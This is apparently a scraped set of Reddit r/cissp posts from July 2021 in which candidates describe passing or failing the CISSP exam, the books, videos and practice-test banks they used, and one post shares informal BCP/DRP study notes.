3. Full dedication to the process. As mentioned I chose to use my summer break for this certification. My commute to work was not filled with music, it was filled with downloaded videos (mentioned below), via YouTube premium (FREE for one month, do this!) every single day for the duration of my preparation. My evenings were not filled with having beers with buddies, or watching movies with the wife and dogs…. It was spent in our office, reading, watching, listening, writing….. This thing is its own beast, and requires your mental and physical dedication…. Know that before you start this process!
4. Relax, breath, think…. That’s what my scratch pad said…. When I hit a question that went from an easier type question, to a short story…. I had to remind myself to relax, breath…. Which allows you to think.
5. Do not be afraid to fail. This is one thing I told myself starting this process, no matter what happens, I am bettering myself for doing this… I was not afraid to fail, what I was afraid of was of having to continue to study and retake this thing….wasting what I have left of my summer break… so don’t be afraid! After all, it’s a process, and participating in this process you will be shocked at how much you learn and grow!

Resources (what people seem to care about the most):

* Sybex OSG (8th Ed.):

\-Primary resource of reference/clarification for the entire process.

\-First pass, “read” cover to cover… took end of chapter tests, moved onto next chapter.

\-Emphasizing the “read” portion, as I did not read it word for word as some did….. Chapters I felt more comfortable with the material, I skim read and picked points within each chapter I had no idea what is was, and fully read that section.

\-Second pass, read the sections I scored lower than 75% on the end of chapter tests from start to finish, retook the tests.

* Sybex OSG Practice Tests (8th Ed.): Register your book online! Much easier and more convenient as you can access the tests with your phone, or tablet…. I DID NOT take all of these tests, as mentioned I did each chapter test in the manner above. For each practice test, the matter at which I took them, took each Domain test once, pending the score (e.g. below 75-80%) I would go back and review that domain, and then retake the questions I got wrong… to alleviate from memorizing answers.
* 11th Hour CISSP: After I read the massive Sybex OSG I needed more “light reading.” I read this book front to back, easy read…. Very high level overview of the topics. So stepping your mindset back a bit from the OSG source.

Videos:

* CybraryIT -  [Free Cybersecurity Training and Career Development | Cybrary](https://www.cybrary.it/) (free access if you only access a certain number of sources, not do check whatever I did about a ""premium offer""..they'll never stop calling you until you tell them to leave you the heck alone) – Kelly H’s videos… these were a great change of pacing getting out of a book, and questions. I DID NOT watch all of these….I watched her videos on topics I needed clarified, or explained in another way from my reading.
* Destination Certification Mindmaps -  [CISSP MindMaps / Domain Review - YouTube](https://www.youtube.com/playlist?list=PLZKdGEfEyJhKWyryIvx_jm1jn6ZMTi7gW) : Wow, yes, I watched all of these…. And some of them multiple times for topics I just wasn’t grabbing onto….. 10/10 recommend this to help tie words together that may help you on the exam.
* Inside Cloud and Security -  [CISSP Exam Cram - YouTube](https://www.youtube.com/playlist?list=PL7XJSuT7Dq_XPK_qmYMqfiBjbtHJRWigD) : Again, yes, I watched all of these…… And some of them multiple times (probably each of them at least twice). I used his 2021 topics videos to supplement the OSG version I used not having the most recent topics.
* Prabh Nair’s CISSP videos, and Coffee Shots -  [Prabh Nair - YouTube](https://www.youtube.com/channel/UCfZMpaSGpTa4JoqoZHCJBcw) : I incorporated these my final two weeks of study (by the point you’re either getting it or you’re not)… his videos were great! I also used his 2021 topics videos to supplement the OSG version I used not having the most recent topics. Tip for his videos, put the speed on .75x… he speaks rather quickly…. This helped my tremendously.
* Andrew Ramdayal CISSP videos -  [CISSP - YouTube](https://www.youtube.com/playlist?list=PLdC3YQR4lNFLHJh_lOd2QMovHjhEdTFjN) : I watched all of his videos once, particular one that stood out to me was his “Testing Tips” and “Practice Question” videos.

Questions:

* OSG Practice tests
* CISSprep.net: I was hesitant on buying this… just because I am cheap, and the mixed opinions… I personally enjoyed this platform, the questions were a headache, yes…grammar mistakes, some complained about not knowing single or multiple answer options…whatever, if you’re worried about that… you’re head is not in the right place. Pass the exam, make your own prep engine that is grammatically correct with explicit instructions of SELECT ONE....….(end rant on CISSprep). Scores ranging from 50-80%.... my overall average score was 65.8%.. I tracked my scores throughout the process... OCD, sometimes, more of a moral booster....
* Pocketprep App: This was an awesome resource for me because of convenience. Can be taken on your phone or table! Definitely helps nail down the factual items to build the conceptual knowledge you need.
* ISC2 Official Study App: Again, great resource due to convenience! Great supplemental method of doing questions to keep your mind on topics along with Pocketprep.
* rSlades blog post on ISC2: [Practice Questions - (ISC)² Community (isc2.org)](https://community.isc2.org/t5/Exams/Practice-Questions/td-p/18626?fbclid=IwAR138lfLPSzBL90njFDCi6Xe0j-wUXT7i1I4nw8iS3rs33HyV-P_tMlzU_0). These were awesome, another source of questions with explanations (sometimes collaboration from viewers)

Notecards:

*   I made note cards for basic topics, processes, procedures, and concepts I knew I needed to have in an instance… maybe 50-75 notecards total, I did them every day before work, and every night before bed….things such as: SDLC, BCP, DRP, BIA, SOC reports, Security Models, Incident Response, RMF, RAID, Backup Types/Benefits, SAML, ISC2 Cannons, Cryptography. More or less things I knew I needed to nail down, processes/steps, and random things I just always have a hard time committing to memory. 

Anyways, yeah…. I am humbled, overwhelmed, and gracious to join the ranks of fellow CISSPs! Thanks to all for continuously keeping this thread alive (daily), I lied in wait for a while taking notes on peoples prep methods, inputs, etc. and here I am! Thanks to all those on here I reached out to with questions/advice! Now I am going to enjoy the month I have left before back to the educational grind in the evenings!

Good luck!",2021-07-20

470,onz36q,Passed (1 hour ago :D) 1st Try 100 Questions,"In the words of Colin Weaver ""Hey all you CISSP wanabees""

I just got back from my exam and all my thoughts are fresh in my mind so I thought I could share them with this group.

**My Background**

I've been in Cyber Security for just over 5 years. I work for a fortune 500. I'm a manager for a team that works on data security: DLP, DRM, Insider Threat.

**How I studied**

I started studying in late September or early October of last year. I went through the official study guide. I read through the entire book and took notes as I went. I used the online test bank that comes with the book and was going through. I was studying maybe 1 hour a day and usually 2-3h/day on weekends. Around Christmas I got burned out and then picked it back up around the end of January.

Then I went through the Destination Certification videos. I was getting about 80% on my Sybex practice exams and I felt good. Sybex also has online flashcards which helped too. At this point I was studying a minimum 2 hours per day. I went to book my exam and saw that the testing facility had filled up and I couldn't take my exam for another 2 months. (This pushed me into May and the updated course.)

With my extra time to study and to prepare for the updated course I watch Mike Chapple's Stuff on LinkedIn Learning. I'm not sure I would recommend the course, I can't remember a single topic I retained from his class. He did cover some topics for the new exam but he presented in a really dry way. I was watching at 1.25 speed the entire time. I also downloaded Anki, a flashcard program which was one of my best tools. Someone has uploaded some free practice questions that you can search for. I also just started adding terms and topics I needed to study harder. When I would go through an exam and get something wrong I would add that as a card. I have reviewed flashcards everyday since May.

With one last weekend before my exam, I bought some extra practice exams to study. I bought CISSP Exam Prep and the Udamy course. I took the Udamy exam and got a 40% three days before my exam date. Let's just say I was a bit concerned. I started taking the CISSP Exam Prep exams and I was getting 50%-60%. I freaked out and after some discussions with my fiancé decided to pay the $50 and reschedule for July.

I wanted to study seriously for the next two months with my extra time. I started by going through Kelly Handerhan's course. Her course was really good for what it covered but it doesn't cover all topics. Then I started going through the CISSP Exam Prep practice exams every other day. Then on the other day I would review other materials. I reviewed the Sybex book again. I read the 11th hour book (I wouldn't recommend it). I did IT Dojo Questions of the day, these were good when I was burned out from doing other things. I also studied my flashcard every day. At this point I was probably studying 2.5 hours everyday. I would also do Boson exams to get ready and identify gaps in my knowledge.

Yesterday, I reviewed my flashcards and then meditated a lot to calm my nerves. I watched Kelly Handerhan's why you will pass the CISSP exam. I had 3-4 questions where this video directly helped me.

**The Exam**

I expected the exam to be less technical than Boson and CISSP Exam Prep. It was. It was more straightforward knowledge based than I expected. I was expecting more experience questions but most of the questions were around a specific piece of information from the CBK. I kept hearing ‘think like a manager’, but I felt like there were more knowledge based questions. They weren't trying to trick you as much as I was expecting. I felt like I was very prepared with what I had learned and studied. Once I got into the exam it wasn't as bad as I was expecting. I felt okay about a lot of questions. In the last 10 questions, the questions got easier and I ended right at 100.

**What I recommend**

Reading the Sybex book was painful but had to be done. I think after that I would have done a visual refresher like Destination Certification. Using Boson and CISSP Exams, but using them to learn, not killing yourself on the score you get. You can't get a 40% and expect to pass but don't worry if you are getting a 66% vs a 70%. These exams are way more technical and complexly worded than the real exam. They help you prepare for the mindset of being able to pick apart a question. For example, if you see a question about control implementation, you better make sure you know if they want a preventive control, a detective control, an administrative control, or a technical control. That’s the mindset you need to have. Flashcards are a must for cementing topics in your head. I highly recommend Anki. I didn’t do a bootcamp but looking back I should have asked my company to buy me one. 

I don’t recommend the Udamy exam. It was overly confusing and just intentionally difficult. Some of the questions I was just mad at and would roll my eyes at why they said the answer I chose was wrong. 

Booking the exam well in advance is important. I didn’t realize that it would fill up. I checked once and they had openings every wednesday. Then I went to schedule my exam, and it was full for the next two months.

If I was doing it again, I think I could have shortened my study time, if I had done the practice exams earlier. I had relied a lot on the Sybex exams and thought those would be enough but they weren’t for me, they gave me a false sense of security. 

**Content Refresh**

I know a lot of people want to know how different the content is for the new exam. I do think I got a couple questions on new content but it was topics that I was familiar with through my work so it wasn’t very difficult.

**Overall**

Keep studying, keep working, keep your faith. Good luck everyone!",2021-07-20

472,onxvll,Provisionnally passed @100 questions,"Hi,

Just wanted to share my feedback after passing provisionnally.

&#x200B;

**About me**

* About 10 years experience in IT Audit, GRC, CISO. Not really a tech guy.
* I registered 2 years ago, had zero motivation to study and rescheduled it. Then covid arrived and I had to reschedule two more times...

&#x200B;

**Preparation**

1. Eleventh Hour CISSP - I did not open at all the official guide, but I have read twice this smaller book. Very good starter for lazy people like me.
2. CISSP Official Practice Tests - Did all questions and looked on internet to understand when I was wrong. Resources I used the most.
3. PocketPrep (IT & Security) - Very good to test your knowledge with direct questions to use during transports. Not too technical and not too expensive. I did all questions.
4. Random website ([http://luc.desfosses.fr/CISSP/](http://luc.desfosses.fr/CISSP/)) - I do not remember where I found it, probably on reddit, but this has been a good summary of key concepts. I also wrote on paper the key concepts (OSI, ports, security models, SOC, BCP, ...).
5. 2021 Exam change - As I took a very long time to get the motivation to start studying, the content has changed in May so I looked to the changes on this website [https://www.cybervista.net/cissp-may-2021-exam-update/](https://www.cybervista.net/cissp-may-2021-exam-update/)

I hesitated a lot to buy Boson questions after reading this reddit, but I also looked at many feedbacks here saying that Boson questions were too technical compared to the exam so I did not buy. And to be honest I think that knowing more technical details would not have helped at all. At least I saved some money.

&#x200B;

**Exam**

* As most of people here I was not very confident that I would succeed during the test. I thought I would go to 150 questions but it ended at 100...
* You really need the high level view of what is used for what (concepts). You do not need to bother learning by heart every technical details of everything.
* Work experience helped a lot, although I am not a tech guy I review lots of risk analysis and the mindset is similar.

474,ooeqh5,CISSP Is Overhyped,"Context: I'm 18 and a senior in a Cybersecurity Engineering program

Did 25 practice problems last night and went in with an hour of sleep into the exam (Couldn't put down the video games lol). Exam ended at 120/150 question and I passed.

I felt offended at how easy it was. In my opinion, it was much easier than even Security+. And we all know how much of a joke Sec+ is.

If someone can study for the CISSP while taking 16 credits over the summer and playing Genshin Impact for 6 hours a day then I'm sorry but the exam has lost its credibility.

I will try for OSCP after the summer semester ends and hopefully it doesn't end like CISSP.

I have been in the Info Sec world for a little over 4 years as a security generalist for 2 medium-large companies (technical title is Security Engineer but it's more a combo of engineering/analyst work/compliance stuff - basically whatever needs to be done).

I have read in various posts that having a study partner or being in a study group is a helpful tool, but I'm not quite sure what that entails - regular group study sessions? IMing each other questions? Having someone to console you when you realize your brain is too small to retain any knowledge??

My current study plan is:

1. **July 8 - Jul 30:** Self-Study with Mike Chapple Linked-In Course. Review with Pocket Prep app. Take test quizzes/exams on CISSPrep after finishing course videos.
2. **Aug 2 - 6:** TIA CISSP Bootcamp
3. **Aug 9 - September 15:** Review Bootcamp notes, Create Flashcards, More CISSPrep, Read Official Study Guide Cover to Cover (the book comes with my bootcamp), Do Practice material in Official Study Guide
4. **September 16:** sacrifice goat
5. **September 17:** PROFIT?

**I don't know if this is enough.** If feel so unprepared even though i have only been watching the course and taking notes for a little over a week. For my previous 2 certs (Sec+ and GCED) I just took a bootcamp, studied a little, took a few practice tests and I was ready to go. Had no issues with either exam. But I am dreading this one. 

So I'm wondering if adding a study buddy/study group will help me feel less...stupid? Or at least help me to know if I'm way off base with my learning.

479,on293l,"Passed and certified, here are my thoughts.","Hey everyone, as the title states I provisionally passed my CISSP exam at the end of June and was fully certified by (ISC)² three weeks later. I delayed making a post to formulate my thoughts regarding the entire experience.  This post is kind of long, TLDR at the bottom. 

Initially I reviewed this subreddit to get a grasp of where to begin, though I will admit I didn’t follow the suggested study plan.  I studied lightly on/off for 3 months and diligently for 2 months. Make sure in the lead up you take time for yourself. If you begin feeling burnt, stop for a while.  Play some games, go for a run, or talk with a friend about non CISSP stuff. Studying through fatigue will only hurt you. 

For background I have 5 years direct information security work experience and a graduate level degree. 

Books
- CISSP All-in-One Exam Guide, Eighth Edition, 8th Edition - Rating: 8/10
- Sybex (ISC)² CISSP Certified Information Systems Security Professional Official Study Guide, 8th Edition - Rating: 10/10

The AIO helped me get into the right mindset regarding the exam. The dialogue referenced many real world applications of the concepts. 
The Sybex book was by far the best study resource for exam preparation.  It covered everything necessary for exam prep. 
When I encountered a topic or concept in either book I was unsure about (even slightly) I transcribed the definition or section verbatim into a spiral using a pencil (tactile feedback)

Practice Exams
- (ISC)² CISSP Certified Information Systems Security Professional Official Practice Tests (online bank included with the book) - Rating: 9/10
- Boson - Rating: 2/10
- Pocket prep (free 30 questions)- Rating: 3/10

The official practice tests online were invaluable for isolating the areas I had deficiencies in. Additionally, the flash cards were great for quick studying throughout the day. 
The Boson test bank was large, though in my opinion the program was clunky and the questions were not as useful as reviews I had read made them out to be. I didn’t use the Boson tests in the final stretch of my study. It may work for you, though I suggest trying the official practice tests (included in the official guide package) before shelling out money to Boson. 
PocketPrep was great for quick study when I was waiting in lines or had a spare moment. I didn’t purchase the full version as I had already purchased the Boson bank. 
Overall, the practice tests were nice to prepare me for timing on the exam and identifying deficient areas, though they are not reflective of the exam itself. As difficult as it may be, don’t put too much stock in the practice exam scores, instead use the data to focus your study efforts. I really dug my heels into practice exams in the final few days before the exam and found myself doing worse and burning myself out.  Much like the books I hand transcribed the answers to questions I got wrong and flagged them. 

Audio/Video
- CISSP, 2nd Edition Sari Greene - Rating: 7/10
- Destination Certification (YouTube) - Rating: 4/10
- Eleventh Hour CISSP Study Guide (Audible) - Rating: 10/10

Sari Green is great. The videos were encouraging and the knowledge tests assisted in recalling useful information. I will admit I didn’t finish the series as it wasn’t as in depth as the official study guide. 
The Destination Certification YouTube series was nice for background study and reference, though for me it was more of a feel good effort. Some of the graphics assisted me in mentally categorizing information. 
Eleventh Hour was fantastic. I snagged it on Audible in the final two weeks of study, listened to it at 1.25 speed while working out or cleaning and would make notes on my phone of topics I wanted to review in depth. This resource often highlighted information that I gleaned over in the books.

Endorsement Process
Once I passed, I created my account and submitted my application. There are no CISSP’s that I work with so I opted to have (ISC)² sponsor me. 2.5 weeks after submitting my application (ISC)² stated they needed additional verification of my work history. Unfortunately my place of employment refused to write/provide a letter of affirmation regarding work history and directed me to a third-party service. I provided the information to (ISC)² and received feedback that they will not interact with a third-party. (ISC)² then stated they were going to audit my application. I won’t lie to you all, this stressed my out after having read some horror stories on this subreddit. 
Nearly out of options, I provided tax documents (with sensitive information redacted) and unofficial transcripts. The next day I got a notification that my application was accepted and I could pay my membership fee.  

Overall, it was a lot of study and felt daunting at times. Take it a topic at a time, write things down, and take breaks! Good luck everyone!

TLDR: The Official (ISC)² study materials are S-tier, don’t stress over practice exam scores, take breaks and separate when you get tired.",2021-07-19

481,omj3yq,7/10/21 Fail at 150 questions,"Sigh. Here I am writing the post I never wanted to write. I went for it on 7/10/21 and didn’t pass. Hoping to help others and get a little advice on the next steps to take. 

Per my previous post [here](https://www.reddit.com/r/cissp/comments/oexlqz/cue_the_panic_5_days_until_exam_date/?utm_source=share&utm_medium=web2x&context=3), I have five years experience in a non-technical role within InfoSec. No technical background whatsoever. I'd been studying off and on for a little over a year, four consecutive months of intense study, and utilized the usual suspects: Shon Harris AIO, 11th Hour, IC2 OSG, Destination Certification MindMaps, Boson, PocketPrep, handwritten notes, flashcards and all of Kelly's videos on Cybrary. I’d also taken a 10-week boot camp class three times.

I knew there were topics I didn’t have down 100% but felt I *probably* knew enough to get me by. When I sat down at the computer to take my exam, I knew I was in trouble 20 questions in. The questions looked so foreign and vague. I read and reread and reread every question, breaking the sentence down by word, looking for some semblance of anything I’d seen before. I couldn’t make sense of any of it. I had anticipated this since that’s what everyone says but that didn’t cushion the shock.

I went all the way to 150 questions. I saw a lot of questions on SDLC, at least five questions on SOC compliance and a few on DRP/BCP. Nothing super technical with the exception of a few IPSec and tunneling protocol questions. Nothing on Kerberos, nothing on OSI. Out of all 150, I felt confident I knew the answer on maybe 5 questions. 

What’s really crazy is that I had “think like a manager; don’t DO anything” tattooed on the inside of brain going in. But none of the questions, nor any of the answers, within my exam were structured that way or provided answers that were that high-level. I’m not a technical person so it’s not my instinct to “fix” anything. There weren’t any “weeds” to get into. The questions weren’t super technical but they most definitely weren’t high-level. Somewhere in between, if that makes sense. 

I was below proficiency in four domains, near proficiency in three, and above in one domain. Interestingly, the domains I’d considered my weak domains while studying were my strongest, and my strong domains were “below proficiency.”

So now I’m trying to decide what to do: whether to give it another go or maybe try another certification like Security+ to help build up my confidence. There’s a real big part of me that wants to keep going and build onto the momentum I had and try again in 60-90 days. There’s another smaller part of me that wants to walk away from it completely and get my life back again and enjoy the rest of my summer.

Any advice, opinions, feedback? Should I try again or go for Security+? Is this just too big an elephant to eat for a non-technical professional?",2021-07-18

483,om95hn,BCP/DRP Quick Notes,"Some general BCP/DRP notes I had lying around if it helps anyone:

At a high-level, the most important thing to remember is that a BCP/DRP program has two main objectives: the first one is to preserve human life, to keep the human heart beating.  Second is one of the corners of the CIA Triad: availability.  Much like the human heart, the second high-level objective is to keep the lights blinking and systems online.

The topic of proper business continuity and disaster recovery planning is **highly testable**.

BCP process and steps (Not specifics, just the general flow)

* Components of the Business Impact Analysis (ARO, MTTR, MTBF, SLE)
* The idea that all stakeholders of a BCP should be involved in the planning
* Business continuation strategies
* The importance of documentation

**Here are some important concepts to remember**:

* The process of recovering an organization's critical business functions after a disaster is known as BCP
* Dealing with a more immediate or specific emergency is known as DRP.
* Difference between BCP and DRP
* BCP is more high-level than DRP.  DRP falls under the umbrella of BCP.
* ""What if our main data center was destroyed by an earthquake, what do we do?"" - That's BCP.
* ""What if our firewall failed at our main data center, what do we do?"" - That's DRP.
* The start of any organization's DRP/BCP program must have the approval of the senior management team
* Management's approval is also a show of their support
* BCP/DRP is all about documentation, documentation, documentation
* According to the CISSP, the first thing to look for in a disaster is the proper documentation that contains procedures and guidelines on how to deal with a disaster
* As with all things CISSP, keep the BCP/DRP document alive with regular updates.  Changes to the organization's governance, infrastructure, or an addition of a new technology should be reflected in the BCP/DRP.  Users and executives alike should also accumulate a certain level of training, education, and security awareness to contribute to a strong BCP/DRP program.

**Here are some types of disasters**:

* Man-made
* Negligence
* Warfare
* Fires
* Terrorism
* Insider threat
* Cyber attack
* Natural
* Flood
* Earthquake
* Tornado
* Tsunami

**The basic steps of a sound BCP are**:

* Phase 1: Scope and Initiation
* Phase 2: Business Impact Analysis
* Phase 3: Recovery Strategies and Continuity Development
* Phase 4: Implementation and Testing
* Phase 5: Maintenance

**RTO vs RPO vs MTTF vs MTTR**

RTO is the maximum amount of time that is needed to bring critical business functions back to normal operating status before that business is crushed.

RPO is the measure of at what point in time a business can go back and still salvage enough data to fully operate.  For example, can a business lose all the data it has accumulated in the last 10 minutes and still operate as a business? Probably.  But can it lose all the data it has accumulated in a 12 hour period and still function? This depends on the type of business.  A company that deals with the stock market and money, probably has a really short RPO, compared to a school with a database of past test scores, which could have a longer RPO.

MTTF as we stated is the same thing as MTBF.  It is the measure of how long something is supposed to operate before failure.

MTTR is the amount of time required that is necessary to bring a critical business function back to operation.  The mean time to recovery for your 2nd monitor in a dual monitor setup can probably be 72 hours to a week before you start finding it necessary to have a 2nd monitor again.  The mean time to recovery for your mouse is probably a lot shorter, maybe minutes to hours?

492,ol29bu,Provisional Pass,"Hey ladies and gents,

I took the test yesterday just out of whim. I'm a network administrator with 8 years experience. I honestly think that Security+ was harder than the CISSP exam and I think that could be attributed to the large body of knowledge and question pool that usually comes with CompTIA exams. I'm at the tail end of a Cybersecurity degree so maybe that helped out but I just went in to the test with a ""ain't nothing to it but to do it"" attitude. The body of knowledge illustrated by ISC2 is crucial to planning out how you need to study if you have prior knowledge of the field. I think my networking experience helped out too. The toughest part for us technical folks I believe would be moving away from our traditional thought process when it comes to solving problems. There are going to be multiple choices that feel like the right answer but it's all about management mentality that'll help find the ""most"" right answer. CBT nuggets helped as a sort of passive learning tool just by being able to put it on while I'm driving too and from work. For everyone else wishing to pursue this certificate I wish you all the luck!",2021-07-15

**About Me** - 9 years of experience in IT Audits, Risk and Compliance, and conducting Security Assessments. Studied for close to 6 months.

**Preparation**:
 * This subreddit - Honestly I would not have passed if it wasn't for you guys. All the resources I used below (except the OSG) I found out through all of you.   
 * OSG 8th edition - very comprehensive but I think one of the best resources.   
 * Kelly Handherhan's course on Cybrary - Her delivery and teaching style cements concepts into your brain.   
 * Destination Certification Mindmap videos and CISSP CRAM on Youtube - Very useful for reinforcements. Highly recommend watching these 1 or 2 weeks before the exam   
 * CISSPprep.net - This one was amazing. I felt the real exam questions were similar to the questions here. It was frustrating because I was scoring only 60% on an average but helped me a lot in identifying my weak areas.  
 * Eric Conrad 11th Hour CISSP - Unpopular opinion but this didn't work for me.   
 * Official practice tests 2nd edition - Make sure to read the reasons for why something was right or wasn't right.  
 * Kelly Handerhan - why you will pass the CISSP - cannot recommend this enough.   

**The Exam**: Can't say anything that hasn't been said before. Most of the questions I could boil it down to two options, some questions were direct. I honestly thought I failed. Do not bother memorizing anything. I made sure I read each question 2-3 times and put on my manager hat.

504,oi6439,Passed - 2'nd Attempt,"All, 

Would just like to give my 2 cents since I passed the exam yesterday and previously posted in this forum about failing this exam in February.  Honestly, it was heartbreaking back then and I didn't even know if I wanted to go through the process again.  I somehow found the motivation to give it one more try and I passed yesterday with literally seconds left at 120+ questions.  I thought for sure I would fail or that I'd run out of time as the questions kept coming in. 

The exam is an absolute beast and I don't think any amount of studying will fully prepare you for this thing.  Even on the second attempt, I felt complete beaten up by the test and saw things that I saw no where within the study materials.  I'd estimate I studied over 250+ hours combining from the first test. 

I honestly can't say anything that you don't already know.  You need to study the normal materials, but you also just need to have the right mindset.  Thinking like a manager is easy to say, but I'm just not sure how much that carries on this test when you're going through it.  I'd say my best advice is don't worry about knowing specific definitions, but knowing exactly how everything works in a real world setting is much more important. 

Also I went with the approach of reading the question multiple times and even purposely slowed down on questions I knew the answer.  I don't think this is a good approach considering I literally had seconds left with potentially a LOT of questions left if the exam was to continue. 

I am beyond relieved and taking some much needed time off.",2021-07-11

I was panic reading until last minute trying to cramp as much knowledge as possible, my best advice is to relax on the exam day.  After around 15-20 questions I started to develop the feeling that I will surely fail the exam.  Like many of you said in past no test bank will prepare you for the actual exam questions. They are worded differently and make you feel tempted to click the wrong answer, be sure to read the question multiple times. There were questions where i purely guessed the answer as I never read those topics in my life. I was mentally exhausted and was preparing for the worst and after 100 question the test stopped.  I went to the front and received the result and to my surprise i passed, i couldn't hold my excitement and shouted a big YEESSSSSSSS.  While collecting the items the tears rolled down (its okay to cry). This exam was not just exam it was my dream, I am not sure what it will hold in future but it was my first professional level exam and i gave all for this exam. I always stayed around 2 hr after work just to study for the exam. I prepared this exam for almost 1 year getting distracted in between with free COMPTIA beta exams. I am currently in US in F1 visa (student) and its really hard to find the Job, the struggle is REAL.

506,ohxoha,Passed today - was certain I didnt!,"First - I'm making this post because reading everyone elses helped me a LOT. So, Reddit = 10/10

Second - I'm an idiot, I don't learn fast, and this shit was hard to study for. If you are reading this you are smarter than I am - you will pass this.

The exam was brutal. 20 questions in and I'm already mentally preparing to fail. The test stopped at 100Q and I would have bet $100 it was because I couldn't mathematically pass with more Qs. I shit bricks when I saw the Congrats. So here my biggest takeaways -

I used very few resources

\- the 2018 official guide and matching practice exam book(has 1000+ Q's, get this!),

\-the Syngress 3rd edition study guide and the Syngress 11th hr book (same authors)

\- Boson practice tests.

\-Thats it.  No new material studied for the updated exam - not needed!

Here's what I did

\- read every book, cover to cover, and highlighted the important concepts /facts.  If any of the material puts information in an outlined box - that's not extra info, its stuff you REALLY need to know.

\-Practice tests. Do as many as you can, find your weak domains, go back to the books and skim through your highlights, and take more tests.  Do NOT memorize the answers to your practice test, I promise this is a sure way to fail.

&#x200B;

* Key to passing- Answer your practice question correctly, then explain to yourself \*why\* the question was correct.  I didn't come across a single question on the real exam that resembled anything close to the 2000+ practice questions I took, but understanding why you chose the practice question answer is the secret sauce.

510,oh9f9h,"Passed at 100 questions, ~2 weeks of study, 7 years IS experience","
Got sort of voluntold to get this by EOY about a month ago. Did the Training Camp bootcamp (I do not recommended, more below) last week as I had a “free” week between engagements. Hadn’t done anything at all prior to that week. Exam was not yet scheduled at the start of bootcamp. A couple days into the class one opened up for today, so I grabbed it. 
I’ll just say that the timing with this PrintNightmare… nightmare could not have been worse.

I did the bootcamp (Monday-Saturday morning).
Did nothing on Sunday.
Did a few practice tests Monday (holiday)
Tuesday actually got some real studying with notes and everything!
Wednesday all hell broke loose with the PrintNightmare patch and that sort of took over the rest of the week for me. My study time turned into very short (10-15 question) practice tests when I could grab a few minutes during the workday, then did the real ones (100-150) after hours. 
Exam was this afternoon, Friday, and I can’t wait to actually sleep tonight. 

I passed at 100 questions and I have no idea what the time was.
I was just as surprised how confident I was with many of the questions as I was with how many I stared at and second guessed for probably far too long. 

Study materials:
- Training Camp Bootcamp - I chose the virtual classroom option, not knowing that it was actually a hybrid class and I’d basically just be sitting on mute watching a live class with no real interaction. The instructor I had elected not to use the ISC2 training materials provided his own stuff, which he had not yet updated for the new CBK. There were some other issues, but those was the main ones. 
- CISSPrep - I literally got an account last night after seeing someone on here mention that their practice tests are hard. I wish I’d known about that sooner, probably would have passed on Training Camp, or any live training, entirely. 

Practice exams:
- CISSPrep - I found these to be the best. They’re hard, and it can be discouraging to do poorly. I found that the questions forced me to think the right way. Feedback on missed questions is both great and can be incredibly frustrating because if you miss a “not tricky” one it forces you to go look it up yourself and you actually LEARN.
- Sybex (latest version of the book, online question bank, and the app) - these were ok. The online bank and the app didn’t sync well, so I kept getting repeat questions despite toggling that setting off. It could stand to give better feedback on missed questions. 
- PocketPrep - Found it useful for short quizzes. Probably could have gone without this one but that’s ok. I liked being able to see the user average.
- CCCure - This was way more frustrating than it was helpful. I guess they let others contribute to their test bank to have it be like the real question pool where you’ll encounter questions written in different ways, but after awhile you start to be able to pick out questions by author, especially the bad ones, and there are bad ones. And with that comes a lot of inconsistency in answer explanation. Definitely could have gone without this one, and it was the most expensive by more than double. It was also recommended by the TC instructor but that’s neither here nor there.

511,oh3qjj,"Pass @ 100 Questions - 2 weeks of study, 10 years of IS experience (4yrs as CISO)","**And if you're newer to the industry: Even as a CISO, I didn't know a lot of this. So good on you if you can pass on the first attempt!**

About 5 years ago I was planning on getting my CISSP, but I got a promotion to a CISO and never felt the need to get it. Fast forward to remote work culture (and a few kids later) and now I'm re-evaluating where I want to be in the future (hint: It's less management and more technical problem solving).

I found this board and noted a few things. One that stood out was the PocketPrep resource. I took a few free practice exams to gauge where I was. Initial tests showed that I was averaging about 60%. I figured with a bit of hard-core ADHD studying, I could get it done. I bought the 8th edition of Shon and read that from cover-to-cover (highlighting all the important pieces) over the course of a week (coffee break? Grab the book. Bathroom break? Grab the book. Every meal? Grab the book).  I subscribed to PocketPrep and after reviewing Shon, I took a few exams. Where I was coming up short, I went back and refreshed on those domains. After burning through the rest of the PocketPrep question bank (with about 3 days to go), I found a question bank from Cybrary/Kaplan ([https://app.cybrary.it/immersive/enrollment/activity/27008376](https://app.cybrary.it/immersive/enrollment/activity/27008376)) and used their bank. After going through those questions, I realized that Shon was a little light in certain areas (despite the fact that it's 1300 pages). If I had more time, I probably would have acquired their referenced source as Shon does did not even reference some of the items found in the Kaplan questions ([https://www.amazon.com/CISSP-Cert-Guide-3rd-Certification/dp/0789759691](https://www.amazon.com/CISSP-Cert-Guide-3rd-Certification/dp/0789759691)).

Overall the exam included a lot of ""BEST"" or ""MOST"" answers and as a professional who lives in grey waters, I could constantly hear myself say ""It depends"", but context seemed to always be lacking. I honestly still don't know what the right answer was for most of them as often times it felt as though all 4 were correct, it just depended on your definition of ""BEST"".

At 100 questions/90 minutes I got kicked out. Since I was already borderline when I first took some practice questions, I took that as a good sign.

My job experience:  
4 years CISO (Definitely helped as I've dealt with a lot of this information from OJT and never heard of a lot of it when I was in my engineering roles)  
5 years in Analyst/Engineer Roles  
10 years of various IT/Sysadmin positions  


If you've been in the industry for a while, these questions still suck, but just buckle down for a few weeks-month and press through it. You got this!

I took and passed the exam is 2007 when it was 250 questions and paper based. Waited 4 weeks for results. After holding cert for 10 years, I let my cpe’s expire. I have 25 years of experience, obtained dozens of certs and have been in CIO position for last 7 years. I recently passed CISM and decided to also re-take cissp, so I did…..and failed. I don’t settle for f’en failure so back to the books. Honesty the hardest exam I have ever taken. It’s doable but geez, you have to earn it. Dedicate yourself to the study materiel that’s available, other posts have mentioned and honestly, they will all get you there. There is no magic pill, study your ass off until you don’t think you can absorb any more, then study some more. You can do it if you commit.",2021-07-10
513,ogv3ld,Passed at 150 Questions and 3 Hours,"Took the exam and passed at 150 questions. I was pleasantly surprised and to be honest I did not expect to read Congratulations on the sheet after I left the testing center. 

One of the weirdest elements of my exam was that it almost felt like the exam was trying to get me to pass. As I passed question 100 I received many questions on concepts that I was most strong in. It really did start to mess with my head because I just assumed that the exam was just feeding me questions to get to 150 as I couldn’t understand how I got the same question on SOC reporting rephrased 5 different ways. 

Studying consisted of:

- Training Camp Boot Camp
- CISSP Exam Cram Youtube Videos
- Study Notes and Theory Test Questions (~200)
- Sybex Test Questions (~300)
- Luke Ahmeds How to Think Like a Manager for the CISSP

